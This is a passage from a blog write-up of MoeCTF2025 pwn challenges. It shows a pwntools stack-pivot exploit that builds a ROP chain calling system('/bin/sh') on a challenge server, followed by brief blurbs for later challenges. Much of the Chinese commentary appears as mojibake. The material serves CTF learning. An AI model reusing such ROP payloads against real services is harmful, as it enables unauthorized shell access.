class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">50126</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *main&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;of your introduction.&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x401219</span></span><br><span class="line">system = <span class="number">0x401230</span></span><br><span class="line">desc = <span class="number">0x404060</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">leave = <span class="number">0x40120f</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x600</span>-<span class="number">8</span>+<span class="number">0x100</span>)  + p64(<span class="number">0x404600</span>) + p64(<span class="number">0x404600</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404060</span>) + p64(ret) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + p64(<span class="number">0x404660</span>-<span class="number">8</span>+<span class="number">0x100</span>+<span class="number">0x10</span>) + p64(leave)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;lease tell us your phone number:&#x27;</span> , payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<ul>
<li>åœ°å€ <code>0x404660-8+0x100+0x10</code>ï¼šé¦–å…ˆ<code>rbp</code>è¢«èµ‹å€¼ä¸ºè¿™ä¸ªåœ°å€ï¼Œç¬¬äºŒä¸ª<code>leave</code>æ—¶ï¼Œ<code>rsp</code>å˜ä¸ºè¿™ä¸ªåœ°å€ï¼Œç´§æ¥ç€ <code>pop rbp</code> ä¼šè®© <code>rsp + 8</code>,è¿™æ ·ä½¿<code>rsp</code>æŒ‡å‘payloadä¸­pop rdiçš„ä½ç½®ã€‚</li>
<li>å¡«å……äº†å¤§é‡<code>\x00</code>å¹¶å°†ROPæ”¾åœ¨è¿œç¦»<code>desc</code>å¼€å¤´ï¼Œé¿å…åç»­å‡½æ•°è°ƒç”¨äº§ç”Ÿçš„æ ˆå¸§è¦†ç›–æ‰æˆ‘ä»¬å†™çš„ä¸œè¥¿ã€‚</li>
</ul>
<blockquote>
<p>   è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªæ ˆè¿ç§»çš„å…¥é—¨é¢˜ï¼Œå¸Œæœ›æ–°æ‰‹åœ¨å…¥é—¨æ ˆè¿ç§»çš„æ—¶å€™ï¼Œä¸è¦ç”¨è‡ªå·±å¤§è„‘æ¨¡æ‹Ÿï¼Œå¤šè°ƒè¯•å¤šè·Ÿè¸ªï¼Œexpä¸€æ­¥ä¸€æ­¥çš„å†™ï¼Œç„¶åå»è§‚å¯Ÿrbpä»¥åŠrspçš„å˜åŒ–ï¼Œæ­¤æ—¶æ‰èƒ½å¯¹äºè¿ç§»çš„è¿‡ç¨‹æ›´åŠ äº†ç„¶äºèƒ¸ï¼Œè¿™é‡Œçš„å‘æ˜¯ï¼Œé¦–å…ˆï¼Œå½“systemè°ƒç”¨çš„æ—¶å€™ï¼Œéœ€è¦é¢„ç•™å¥½æ ˆç©ºé—´ï¼Œå¦‚æœæ ˆç©ºé—´ä¸è¶³ï¼Œå½“è¿ç§»åˆ°bssæ®µä¹‹åï¼Œä¸€äº›æŒ‡ä»¤ä¼šè®¿é—®æˆ–è€…ç”šè‡³ä¿®æ”¹åˆ°åªè¯»çš„ä»£ç æ®µï¼Œå¼•èµ·æ®µé”™è¯¯ï¼Œæˆ‘æ³¨æ„åˆ°å¾ˆå¤šé”¤çš„åŒå­¦ï¼Œä»–ä»¬æŠ¬é«˜æ ˆçš„æ‰‹æ®µæ˜¯ç¡¬ç”Ÿç”Ÿè¾“å…¥è¯¸å¦‚0x600ä¸ªaï¼Œå…¶å®æ— éœ€è¿™ä¹ˆéº»çƒ¦ï¼Œå¹¶ä¸”å¤ªå¤§é‡çš„è¾“å…¥ä¼šå¯¼è‡´æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œå‡ºç°ioé—®é¢˜ï¼Œç›´æ¥ç„å­¦æŠ¥é”™ï¼Œä½ è¦æ³¨æ„åˆ°ï¼Œreadåœ¨è¯»å–çš„æ—¶å€™ï¼Œæ˜¯ç”¨rbpå¯»å€çš„ï¼Œå› æ­¤å½“ä½ æ§åˆ¶äº†rbpä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä»»æ„åœ°å€å†™äº†ï¼Œæ­¤æ—¶ç›´æ¥å†™åˆ°é«˜åœ°å€å³å¯ï¼Œå¦ä¸€ä¸ªå‘çš„è¯ï¼Œå°±æ˜¯ï¼Œå½“ä½ è¿ç§»ä¹‹åï¼Œæ‰§è¡Œsystemä¹‹å‰ï¼Œä¸€å®šè¦æ³¨æ„rbpçš„æœ‰æ•ˆæ€§ï¼Œå¾ˆå¤šåŒå­¦å°†rspè¿ç§»è¿‡æ¥ä¹‹åï¼Œå°±å¯¹rbpä¸ç®¡ä¸é¡¾äº†ï¼Œæ­¤æ—¶rbpç›¸å…³çš„æŒ‡ä»¤åœ¨è®¿å­˜çš„æ—¶å€™ï¼Œä¼šå› ä¸ºrbpæ˜¯ä¸€ä¸ªæ— æ•ˆçš„å€¼è€Œå¼•èµ·æ®µé”™è¯¯ã€‚</p>
</blockquote>
<h2 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h2><blockquote>
<p>fmtç«Ÿç¦»å¼€äº†æ ˆï¼Œæˆ‘èƒ½ä¾èµ–çš„ï¼Œä¹Ÿè®¸åªæœ‰æ ˆä¸Šç°æœ‰çš„æŒ‡é’ˆäº†ï¼Ÿ</p>
</blockquote>
<h2 id="fmt-T"><a href="#fmt-T" class="headerlink" title="fmt_T"></a>fmt_T</h2><blockquote>
<p>è¶Šæ¥è¶Šçƒ­ â€¢ â€œæ·±å…¥æ´ç©´æ¢é™©ï¼Œåˆ°è¾¾ç†”ç«åœ°ç‹±ã€‚â€</p>
</blockquote>
<p>å¼€å¯äº†æ ˆä¿æŠ¤ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure></div>
<p>æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ</p>
<h2 id="hardpivot"><a href="#hardpivot" class="headerlink" title="hardpivot"></a>hardpivot</h2><blockquote>
<p>ä¸€æ¬¡çš„æ ˆè¿ç§»ä¼¼ä¹ä¸å¤Ÿç”¨äº†ï¼Œä½ è¦æ€æ ·æ‰èƒ½å†æ¬¡è¿ç§»å‘¢ï¼Ÿå¦‚ä½•å¸ƒå±€æ ˆæ‰èƒ½æ‹¿åˆ°è¿™ä¸€é¢˜çš„ flag å‘¢ï¼Ÿè¿™ä¸€æ¬¡ï¼Œä½ éœ€è¦æŠŠå‰é¢çš„çŸ¥è¯†èä¼šè´¯é€šï¼Œæ‰èƒ½åœ¨è¿™ä¸€é¢˜æˆåŠŸã€‚åŠ æ²¹ï¼</p>
</blockquote>
<h2 id="shellbox"><a href="#shellbox" class="headerlink" title="shellbox"></a>shellbox</h2><blockquote>
<p>æ²™ç®±ä¿æŠ¤ã€é™æ€é“¾æ¥â€¦I have an idea.</p>
</blockquote>
<h2 id="No-way-to-leak"><a href="#No-way-to-leak" class="headerlink" title="No way to leak!"></a>No way to leak!</h2><blockquote>
<p>æœ‰äº›æ—¶å€™ï¼Œæ˜æ˜éšä¾¿åŠ«æŒç¨‹åºæ§åˆ¶æµç¨‹ï¼Œä½†æ˜¯ä½ å´æ€ä¹ˆä¹Ÿæ³„éœ²ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œåªèƒ½å¹²ç€æ€¥ï¼Œè¿™æ—¶å€™ï¼Œä¸å¦‚è¯•ç€å»äº†è§£ä¸€ä¸‹ret2dlresolveè¿™ä¸ªæŠ€æœ¯å§ï¼Œæ‹¿åˆ°è¿™é¢˜çš„flagï¼Œä¸è¯¥æˆä¸ºä½ çš„ç›®çš„ï¼Œä½ çš„ç›®çš„åº”è¯¥æ˜¯ï¼Œåœ¨åšè¿™ä¸ªé¢˜çš„è¿‡ç¨‹ä¸­ï¼Œè·Ÿç€GDBï¼Œå†é‡æ–°äº†è§£ä¸€ä¸‹åŠ¨æ€é“¾æ¥ï¼Œä»”ç»†çš„è·Ÿè¸ªä¸€ä¸‹å®ƒç©¶ç«Ÿæ˜¯æ€ä¹ˆè§£æå‡ºç¬¦å·çš„ï¼ˆå¹¶ä¸æ˜¯åƒå‰é¢çš„ret2libcä¸€æ ·ï¼Œåªæµ…æµ…çš„äº†è§£ï¼Œä¸å¦¨è·Ÿè¸ªä¸€ä¸‹ä»_dl_runtime_resolveå‡½æ•°å¼€å§‹çš„è§£æè¿‡ç¨‹ï¼‰ï¼Œç›¸ä¿¡ä½ ä¼šå—ç›ŠåŒªæµ…ï¼</p>
</blockquote>
<h2 id="call-it"><a href="#call-it" class="headerlink" title="call it"></a>call it</h2><blockquote>
<p> çœæµï¼šJOP æ”»å‡»</p>
</blockquote>
<p><em>to be continuedâ€¦</em></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£</li>
        <li><strong>Author:</strong> Sadsnowcat</li>
        <li><strong>Created at
                :</strong> 2026-01-26 12:00:00</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2026-02-11 16:30:23
            </li>
        
        <li>
            <strong>Link:</strong> https://sadsnowcat.github.io/2026/01/26/moectf2025/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Writeup/">#Writeup</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/PWN/">#PWN</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2026/01/16/helloword/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Hello World!</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.js';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
                    lang: 'zh-CN',
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZtext"><span class="nav-text">EZtext</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezshellcode"><span class="nav-text">ezshellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A4%E8%AF%86libc"><span class="nav-text">è®¤è¯†libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#str-check"><span class="nav-text">str_check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xdulake"><span class="nav-text">xdulake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boom"><span class="nav-text">boom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boom-revenge"><span class="nav-text">boom_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezlibc"><span class="nav-text">ezlibc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inject"><span class="nav-text">inject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#randomlock"><span class="nav-text">randomlock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syslock"><span class="nav-text">syslock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezprotection"><span class="nav-text">ezprotection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpivot"><span class="nav-text">ezpivot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmt-S"><span class="nav-text">fmt_S</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmt-T"><span class="nav-text">fmt_T</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hardpivot"><span class="nav-text">hardpivot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellbox"><span class="nav-text">shellbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-way-to-leak"><span class="nav-text">No way to leak!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-it"><span class="nav-text">call it</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2026</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sadsnowcat</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        2 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>








    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>